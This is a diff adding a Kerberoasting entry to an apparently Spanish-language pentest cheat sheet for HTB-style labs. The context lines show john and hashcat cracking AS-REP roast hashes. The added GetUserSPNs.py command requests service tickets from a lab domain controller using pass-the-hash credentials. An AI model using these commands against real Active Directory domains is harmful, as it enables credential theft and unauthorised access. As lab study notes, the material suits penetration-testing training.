@@ -219,3 +219,8 @@ john --wordlist=rockyou.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast rockyou.txt 
 `
 
+**Kerberoasting**
+
+*El objetivo de Kerberoasting es recopilar tickets TGS para servicios que se ejecutan en nombre de cuentas de usuario en AD, no cuentas de computadora*
+
+`GetUserSPNs.py -request -dc-ip 10.10.10.18 -hashes <LMHASH>:<NTHASH> domain.htb/john -outputfile hashes.kerberoast` # Obtener TicketsGrantingServices
